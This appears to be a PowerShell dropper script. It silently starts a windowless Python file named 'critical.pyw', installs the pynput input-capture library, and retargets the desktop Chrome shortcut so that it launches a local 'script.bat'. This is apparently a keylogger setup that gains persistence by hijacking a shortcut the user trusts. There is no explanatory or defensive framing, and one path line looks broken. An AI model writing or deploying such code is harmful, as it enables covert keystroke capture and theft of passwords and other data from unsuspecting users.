pythonw .\critical.pyw
pip install pynput
$path = Get-Location
$desktop = [Environment]::GetFolderPath("Desktop")
Set-Location $desktop
$objectivePath = Get-ChildItem -Path .\* -Include *Chrome.lnk 
$objectivePath.Name
$objectivePath = "$(Set-Location)$objectivePath"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($objectivePath)
$shortcut.TargetPath = "$path\script.bat"
$shortcut.Save()




